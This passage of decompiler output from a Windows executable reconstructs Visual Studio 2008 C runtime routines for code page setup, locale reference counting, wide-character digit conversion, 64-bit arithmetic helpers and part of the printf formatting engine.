  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  uVar4 = getSystemCP((int)unaff_EDI);
  if (uVar4 != 0) {
    local_20 = (byte *)0x0;
    uVar5 = 0;
LAB_00417691:
    if (*(uint *)((int)&DAT_0042abc0 + uVar5) != uVar4) goto code_r0x0041769d;
    _memset((void *)(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar8 = &DAT_0042abd0 + (int)local_20 * 0x30;
    local_20 = pbVar8;
    do {
      for (; (*pbVar8 != 0 && (bVar3 = pbVar8[1], bVar3 != 0)); pbVar8 = pbVar8 + 2) {
        for (uVar5 = (uint)*pbVar8; uVar5 <= bVar3; uVar5 = uVar5 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar5);
          *pbVar2 = *pbVar2 | (&DAT_0042abbc)[local_24];
          bVar3 = pbVar8[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar8 = local_20 + 8;
      local_20 = pbVar8;
    } while (local_24 < 4);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar10 = CPtoLCID((int)unaff_EDI);
    *(int *)(param_2 + 0xc) = iVar10;
    puVar7 = (undefined2 *)(param_2 + 0x10);
    puVar9 = (undefined2 *)(&DAT_0042abc4 + extraout_ECX);
    iVar10 = 6;
    do {
      *puVar7 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar7 = puVar7 + 1;
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    goto LAB_004177c2;
  }
LAB_0041767e:
  setSBCS(unaff_EDI);
LAB_00417829:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x0041769d:
  local_20 = (byte *)((int)local_20 + 1);
  uVar5 = uVar5 + 0x30;
  if (0xef < uVar5) goto code_r0x004176aa;
  goto LAB_00417691;
code_r0x004176aa:
  if (((uVar4 == 65000) || (uVar4 == 0xfde9)) ||
     (BVar6 = IsValidCodePage(uVar4 & 0xffff), BVar6 == 0)) goto LAB_00417829;
  BVar6 = GetCPInfo(uVar4,&local_1c);
  if (BVar6 != 0) {
    _memset((void *)(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar11 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar11;
          if (bVar3 == 0) break;
          for (uVar4 = (uint)pBVar11[-1]; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
            pbVar8 = (byte *)(param_2 + 0x1d + uVar4);
            *pbVar8 = *pbVar8 | 4;
          }
          pBVar1 = pBVar11 + 1;
          pBVar11 = pBVar11 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar8 = (byte *)(param_2 + 0x1e);
      iVar10 = 0xfe;
      do {
        *pbVar8 = *pbVar8 | 8;
        pbVar8 = pbVar8 + 1;
        iVar10 = iVar10 + -1;
      } while (iVar10 != 0);
      iVar10 = CPtoLCID((int)unaff_EDI);
      *(int *)(param_2 + 0xc) = iVar10;
      *(undefined4 *)(param_2 + 8) = extraout_EDX;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_004177c2:
    setSBUpLow(unaff_EDI);
    goto LAB_00417829;
  }
  if (DAT_0042c1cc == 0) goto LAB_00417829;
  goto LAB_0041767e;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_00417838(undefined4 param_1)

{
  _ptiddata p_Var1;
  int iVar2;
  pthreadmbcinfo ptVar3;
  LONG LVar4;
  int *piVar5;
  int iVar6;
  pthreadmbcinfo ptVar7;
  pthreadmbcinfo ptVar8;
  int in_stack_ffffffc8;
  int local_24;
  
  local_24 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar3 = p_Var1->ptmbcinfo;
  iVar2 = getSystemCP(in_stack_ffffffc8);
  if (iVar2 == ptVar3->mbcodepage) {
    local_24 = 0;
  }
  else {
    ptVar3 = (pthreadmbcinfo)__malloc_crt(0x220);
    if (ptVar3 != (pthreadmbcinfo)0x0) {
      ptVar7 = p_Var1->ptmbcinfo;
      ptVar8 = ptVar3;
      for (iVar6 = 0x88; iVar6 != 0; iVar6 = iVar6 + -1) {
        ptVar8->refcount = ptVar7->refcount;
        ptVar7 = (pthreadmbcinfo)&ptVar7->mbcodepage;
        ptVar8 = (pthreadmbcinfo)&ptVar8->mbcodepage;
      }
      ptVar3->refcount = 0;
      local_24 = __setmbcp_nolock(iVar2,(int)ptVar3);
      if (local_24 == 0) {
        LVar4 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar4 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_0042a790)) {
          _free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar3;
        InterlockedIncrement((LONG *)ptVar3);
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_0042acb4 & 1) == 0)) {
          __lock(0xd);
          _DAT_0042c1dc = ptVar3->mbcodepage;
          _DAT_0042c1e0 = ptVar3->ismbcodepage;
          _DAT_0042c1e4 = *(undefined4 *)ptVar3->mbulinfo;
          for (iVar2 = 0; iVar2 < 5; iVar2 = iVar2 + 1) {
            (&DAT_0042c1d0)[iVar2] = ptVar3->mbulinfo[iVar2 + 2];
          }
          for (iVar2 = 0; iVar2 < 0x101; iVar2 = iVar2 + 1) {
            (&DAT_0042a9b0)[iVar2] = ptVar3->mbctype[iVar2 + 4];
          }
          for (iVar2 = 0; iVar2 < 0x100; iVar2 = iVar2 + 1) {
            (&DAT_0042aab8)[iVar2] = ptVar3->mbcasemap[iVar2 + 4];
          }
          LVar4 = InterlockedDecrement((LONG *)PTR_DAT_0042abb8);
          if ((LVar4 == 0) && (PTR_DAT_0042abb8 != &DAT_0042a790)) {
            _free(PTR_DAT_0042abb8);
          }
          PTR_DAT_0042abb8 = (undefined *)ptVar3;
          InterlockedIncrement((LONG *)ptVar3);
          FUN_00417999();
        }
      }
      else if (local_24 == -1) {
        if (ptVar3 != (pthreadmbcinfo)&DAT_0042a790) {
          _free(ptVar3);
        }
        piVar5 = __errno();
        *piVar5 = 0x16;
      }
    }
  }
  return local_24;
}



void FUN_00417999(void)

{
  FUN_00413064(0xd);
  return;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2008 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  int **ppiVar3;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0xbc) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0xbc) != &PTR_DAT_0042aee8)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppuVar2 = *(undefined ***)(void **)((int)param_1 + 0xd4);
  if ((ppuVar2 != &PTR_DAT_0042ae28) && (ppuVar2[0x2d] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  ppiVar3 = (int **)((int)param_1 + 0x50);
  param_1 = (void *)0x6;
  do {
    if (((ppiVar3[-2] != (int *)&DAT_0042acb8) && (piVar1 = *ppiVar3, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((ppiVar3[-1] != (int *)0x0) && (piVar1 = ppiVar3[1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    ppiVar3 = ppiVar3 + 4;
    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  _free(_Memory);
  return;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2008 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar2 = (LONG **)(param_1 + 0x14);
  param_1 = (LONG *)0x6;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_0042acb8) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2008 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar2 = (LONG **)(param_1 + 0x14);
    param_1 = (LONG *)0x6;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_0042acb8) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2008 Release

LONG * __updatetlocinfoEx_nolock(void)

{
  LONG *pLVar1;
  LONG **in_EAX;
  LONG *unaff_EDI;
  
  if ((unaff_EDI != (LONG *)0x0) && (in_EAX != (LONG **)0x0)) {
    pLVar1 = *in_EAX;
    if (pLVar1 != unaff_EDI) {
      *in_EAX = unaff_EDI;
      ___addlocaleref(unaff_EDI);
      if (pLVar1 != (LONG *)0x0) {
        ___removelocaleref(pLVar1);
        if ((*pLVar1 == 0) && (pLVar1 != (LONG *)&DAT_0042acc0)) {
          ___freetlocinfo(pLVar1);
        }
      }
    }
    return unaff_EDI;
  }
  return (LONG *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2008 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_0042acb4) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    __updatetlocinfoEx_nolock();
    FUN_00417d09();
  }
  else {
    p_Var1 = __getptd();
    p_Var1 = (_ptiddata)p_Var1->ptlocinfo;
  }
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x20);
  }
  return (pthreadlocinfo)p_Var1;
}



void FUN_00417d09(void)

{
  FUN_00413064(0xc);
  return;
}



// Library Function - Single Match
//  __wchartodigit
// 
// Library: Visual Studio 2008 Release

int __cdecl __wchartodigit(ushort param_1)

{
  int iVar1;
  ushort uVar2;
  
  if (param_1 < 0x30) {
    return -1;
  }
  if (param_1 < 0x3a) {
    return param_1 - 0x30;
  }
  iVar1 = 0xff10;
  if (param_1 < 0xff10) {
    iVar1 = 0x660;
    if (param_1 < 0x660) {
      return -1;
    }
    if (param_1 < 0x66a) goto LAB_00417d61;
    iVar1 = 0x6f0;
    if (param_1 < 0x6f0) {
      return -1;
    }
    if (param_1 < 0x6fa) goto LAB_00417d61;
    iVar1 = 0x966;
    if (param_1 < 0x966) {
      return -1;
    }
    if (param_1 < 0x970) goto LAB_00417d61;
    iVar1 = 0x9e6;
    if (param_1 < 0x9e6) {
      return -1;
    }
    if (param_1 < 0x9f0) goto LAB_00417d61;
    iVar1 = 0xa66;
    if (param_1 < 0xa66) {
      return -1;
    }
    if (param_1 < 0xa70) goto LAB_00417d61;
    iVar1 = 0xae6;
    if (param_1 < 0xae6) {
      return -1;
    }
    if (param_1 < 0xaf0) goto LAB_00417d61;
    iVar1 = 0xb66;
    if (param_1 < 0xb66) {
      return -1;
    }
    if (param_1 < 0xb70) goto LAB_00417d61;
    iVar1 = 0xc66;
    if (param_1 < 0xc66) {
      return -1;
    }
    if (param_1 < 0xc70) goto LAB_00417d61;
    iVar1 = 0xce6;
    if (param_1 < 0xce6) {
      return -1;
    }
    if (param_1 < 0xcf0) goto LAB_00417d61;
    iVar1 = 0xd66;
    if (param_1 < 0xd66) {
      return -1;
    }
    if (param_1 < 0xd70) goto LAB_00417d61;
    iVar1 = 0xe50;
    if (param_1 < 0xe50) {
      return -1;
    }
    if (param_1 < 0xe5a) goto LAB_00417d61;
    iVar1 = 0xed0;
    if (param_1 < 0xed0) {
      return -1;
    }
    if (param_1 < 0xeda) goto LAB_00417d61;
    iVar1 = 0xf20;
    if (param_1 < 0xf20) {
      return -1;
    }
    if (param_1 < 0xf2a) goto LAB_00417d61;
    iVar1 = 0x1040;
    if (param_1 < 0x1040) {
      return -1;
    }
    if (param_1 < 0x104a) goto LAB_00417d61;
    iVar1 = 0x17e0;
    if (param_1 < 0x17e0) {
      return -1;
    }
    if (param_1 < 0x17ea) goto LAB_00417d61;
    iVar1 = 0x1810;
    if (param_1 < 0x1810) {
      return -1;
    }
    uVar2 = 0x181a;
  }
  else {
    uVar2 = 0xff1a;
  }
  if (uVar2 <= param_1) {
    return -1;
  }
LAB_00417d61:
  return (uint)param_1 - iVar1;
}



// Library Function - Single Match
//  __iswctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __iswctype_l(wint_t _C,wctype_t _Type,_locale_t _Locale)

{
  BOOL BVar1;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  if (_C == 0xffff) {
    local_8[0] = 0;
  }
  else if (_C < 0x100) {
    local_8[0] = *(ushort *)(PTR_DAT_0042ae24 + (uint)_C * 2) & _Type;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    BVar1 = ___crtGetStringTypeW(&local_18,1,(LPCWSTR)&_C,1,local_8);
    if (BVar1 == 0) {
      local_8[0] = 0;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return (uint)(local_8[0] & _Type);
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2008 Release

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2008 Release

void __fastcall _write_char(FILE *param_1)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)&param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
    piVar1 = &param_1->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,param_1);
    }
    else {
      *param_1->_ptr = in_AL;
      param_1->_ptr = param_1->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_multi_char(undefined4 param_1,int param_2,FILE *param_3)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_3);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_string(int param_1)

{
  int *in_EAX;
  int *piVar1;
  FILE *unaff_EDI;
  
  if (((*(byte *)&unaff_EDI->_flag & 0x40) == 0) || (unaff_EDI->_base != (char *)0x0)) {
    while (0 < param_1) {
      param_1 = param_1 + -1;
      _write_char(unaff_EDI);
      if (*in_EAX == -1) {
        piVar1 = __errno();
        if (*piVar1 != 0x2a) {
          return;
        }
        _write_char(unaff_EDI);
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __output_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __output_s_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  byte bVar1;
  wchar_t _WCh;
  FILE *pFVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  errno_t eVar6;
  int iVar7;
  undefined *puVar8;
  int extraout_ECX;
  byte *pbVar9;
  char *pcVar10;
  int *piVar11;
  bool bVar12;
  undefined8 uVar13;
  int **ppiVar14;
  int *piVar15;
  int *piVar16;
  undefined4 uVar17;
  localeinfo_struct *plVar18;
  int *local_27c;
  int *local_278;
  int local_274;
  undefined4 local_270;
  int *local_268;
  FILE *local_264;
  int local_260;
  int local_25c;
  int *local_258;
  localeinfo_struct local_254;
  int local_24c;
  char local_248;
  uint local_244;
  byte *local_240;
  int local_23c;
  int *local_238;
  int local_234;
  undefined local_230;
  char local_22f;
  int local_22c;
  int **local_228;
  int *local_224;
  int *local_220;
  int *local_21c;
  byte local_215;
  uint local_214;
  int local_210 [127];
  undefined local_11 [9];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_264 = _File;
  local_228 = (int **)_ArgList;
  local_260 = 0;
  local_214 = 0;
  local_238 = (int *)0x0;
  local_21c = (int *)0x0;
  local_234 = 0;
  local_25c = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_254,_Locale);
  if (_File == (FILE *)0x0) {
switchD_0041828d_caseD_9:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x40) == 0) {
      uVar4 = __fileno(_File);
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar8 = &DAT_0042a648;
      }
      else {
        puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0042d780)[(int)uVar4 >> 5]);
      }
      if ((puVar8[0x24] & 0x7f) == 0) {
        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
          puVar8 = &DAT_0042a648;
        }
        else {
          puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0042d780)[(int)uVar4 >> 5]);
        }
        if ((puVar8[0x24] & 0x80) == 0) goto LAB_004181ff;
      }
      goto switchD_0041828d_caseD_9;
    }
LAB_004181ff:
    if (_Format == (char *)0x0) goto switchD_0041828d_caseD_9;
    local_215 = *_Format;
    local_22c = 0;
    local_224 = (int *)0x0;
    local_244 = 0;
    local_258 = (int *)0x0;
    if (local_215 == 0) {
LAB_00418c81:
      if (local_248 != '\0') {
        *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
      }
      goto LAB_00418c9a;
    }
    do {
      pbVar9 = (byte *)_Format + 1;
      uVar4 = 0;
      local_240 = pbVar9;
      if (local_22c < 0) break;
      if ((byte)(local_215 - 0x20) < 0x59) {
        uVar4 = (byte)(&DAT_00422a58)[(char)local_215] & 0xf;
      }
      local_244 = (uint)((byte)(&DAT_00422a78)[local_244 + uVar4 * 9] >> 4);
      switch(local_244) {
      case 0:
switchD_0041828d_caseD_0:
        local_23c = 0;
        iVar7 = __isleadbyte_l((uint)local_215,&local_254);
        if (iVar7 != 0) {
          _write_char(local_264);
          local_240 = (byte *)_Format + 2;
          if (*pbVar9 == 0) goto switchD_0041828d_caseD_9;
        }
        _write_char(local_264);
        break;
      case 1:
        local_21c = (int *)0xffffffff;
        local_270 = 0;
        local_25c = 0;
        local_238 = (int *)0x0;
        local_234 = 0;
        local_214 = 0;
        local_23c = 0;
        break;
      case 2:
        if (local_215 == 0x20) {
          local_214 = local_214 | 2;
        }
        else if (local_215 == 0x23) {
          local_214 = local_214 | 0x80;
        }
        else if (local_215 == 0x2b) {
          local_214 = local_214 | 1;
        }
        else if (local_215 == 0x2d) {
          local_214 = local_214 | 4;
        }
        else if (local_215 == 0x30) {
          local_214 = local_214 | 8;
        }
        break;
      case 3:
        if (local_215 == 0x2a) {
          local_228 = (int **)((int)_ArgList + 4);
          local_238 = *(int **)_ArgList;
          if ((int)local_238 < 0) {
            local_214 = local_214 | 4;
            local_238 = (int *)-(int)local_238;
          }
        }
        else {
          local_238 = (int *)((int)local_238 * 10 + -0x30 + (int)(char)local_215);
        }
        break;
      case 4:
        local_21c = (int *)0x0;
        break;
      case 5:
        if (local_215 == 0x2a) {
          local_228 = (int **)((int)_ArgList + 4);
          local_21c = *(int **)_ArgList;
          if ((int)local_21c < 0) {
            local_21c = (int *)0xffffffff;
          }
        }
        else {
          local_21c = (int *)((int)local_21c * 10 + -0x30 + (int)(char)local_215);
        }
        break;
      case 6:
        if (local_215 == 0x49) {
          bVar1 = *pbVar9;
          if ((bVar1 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
            local_214 = local_214 | 0x8000;
            local_240 = (byte *)_Format + 3;
          }
          else if ((bVar1 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
            local_214 = local_214 & 0xffff7fff;
            local_240 = (byte *)_Format + 3;
          }
          else if (((((bVar1 != 100) && (bVar1 != 0x69)) && (bVar1 != 0x6f)) &&
                   ((bVar1 != 0x75 && (bVar1 != 0x78)))) && (bVar1 != 0x58)) {
            local_244 = 0;
            goto switchD_0041828d_caseD_0;
          }
        }
        else if (local_215 == 0x68) {
          local_214 = local_214 | 0x20;
        }
        else if (local_215 == 0x6c) {
          if (*pbVar9 == 0x6c) {
            local_214 = local_214 | 0x1000;
            local_240 = (byte *)_Format + 2;
          }
          else {
            local_214 = local_214 | 0x10;
          }
        }
        else if (local_215 == 0x77) {
          local_214 = local_214 | 0x800;
        }
        break;
      case 7:
        if ((char)local_215 < 'e') {
          if (local_215 == 100) {
LAB_00418779:
            local_214 = local_214 | 0x40;
LAB_00418780:
            local_224 = (int *)0xa;
LAB_0041878a:
            if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
              local_228 = (int **)((int)_ArgList + 4);
              if ((local_214 & 0x20) == 0) {
                piVar3 = *(int **)_ArgList;
                if ((local_214 & 0x40) == 0) {
                  piVar11 = (int *)0x0;
                }
                else {
                  piVar11 = (int *)((int)piVar3 >> 0x1f);
                }
              }
              else {
                if ((local_214 & 0x40) == 0) {
                  piVar3 = (int *)(uint)*(ushort *)_ArgList;
                }
                else {
                  piVar3 = (int *)(int)*(short *)_ArgList;
                }
                piVar11 = (int *)((int)piVar3 >> 0x1f);
              }
            }
            else {
              local_228 = (int **)((int)_ArgList + 8);
              piVar3 = *(int **)_ArgList;
              piVar11 = *(int **)((int)_ArgList + 4);
            }
            if ((((local_214 & 0x40) != 0) && ((int)piVar11 < 1)) && ((int)piVar11 < 0)) {
              bVar12 = piVar3 != (int *)0x0;
              piVar3 = (int *)-(int)piVar3;
              piVar11 = (int *)-(int)((int)piVar11 + (uint)bVar12);
              local_214 = local_214 | 0x100;
            }
            uVar13 = CONCAT44(piVar11,piVar3);
            if ((local_214 & 0x9000) == 0) {
              piVar11 = (int *)0x0;
            }
            if ((int)local_21c < 0) {
              local_21c = (int *)0x1;
            }
            else {
              local_214 = local_214 & 0xfffffff7;
              if (0x200 < (int)local_21c) {
                local_21c = (int *)0x200;
              }
            }
            if (((uint)piVar3 | (uint)piVar11) == 0) {
              local_234 = 0;
            }
            piVar3 = (int *)local_11;
            while( true ) {
              piVar15 = piVar11;
              piVar11 = (int *)((int)local_21c + -1);
              if (((int)local_21c < 1) && (((uint)uVar13 | (uint)piVar15) == 0)) break;
              local_21c = piVar11;
              uVar13 = __aulldvrm((uint)uVar13,(uint)piVar15,(uint)local_224,(int)local_224 >> 0x1f)
              ;
              iVar7 = extraout_ECX + 0x30;
              if (0x39 < iVar7) {
                iVar7 = iVar7 + local_260;
              }
              *(char *)piVar3 = (char)iVar7;
              piVar3 = (int *)((int)piVar3 + -1);
              piVar11 = (int *)((ulonglong)uVar13 >> 0x20);
              local_268 = piVar15;
            }
            local_224 = (int *)(local_11 + -(int)piVar3);
            local_220 = (int *)((int)piVar3 + 1);
            local_21c = piVar11;
            if (((local_214 & 0x200) != 0) &&
               ((local_224 == (int *)0x0 || (*(char *)local_220 != '0')))) {
              *(char *)piVar3 = '0';
              local_224 = (int *)(local_11 + -(int)piVar3 + 1);
              local_220 = piVar3;
            }
          }
          else if ((char)local_215 < 'T') {
            if (local_215 == 0x53) {
              if ((local_214 & 0x830) == 0) {
                local_214 = local_214 | 0x800;
              }
              goto LAB_004185a8;
            }
            if (local_215 == 0x41) {
LAB_00418526:
              local_215 = local_215 + 0x20;
              local_270 = 1;
LAB_00418539:
              local_214 = local_214 | 0x40;
              local_268 = (int *)0x200;
              piVar3 = local_210;
              piVar11 = local_268;
              piVar15 = local_210;
              if ((int)local_21c < 0) {
                local_21c = (int *)0x6;
              }
              else if (local_21c == (int *)0x0) {
                if (local_215 == 0x67) {
                  local_21c = (int *)0x1;
                }
              }
              else {
                if (0x200 < (int)local_21c) {
                  local_21c = (int *)0x200;
                }
                if (0xa3 < (int)local_21c) {
                  piVar11 = (int *)((int)local_21c + 0x15d);
                  local_220 = local_210;
                  local_258 = (int *)__malloc_crt((size_t)piVar11);
                  piVar3 = local_258;
                  piVar15 = local_258;
                  if (local_258 == (int *)0x0) {
                    local_21c = (int *)0xa3;
                    piVar3 = local_210;
                    piVar11 = local_268;
                    piVar15 = local_220;
                  }
                }
              }
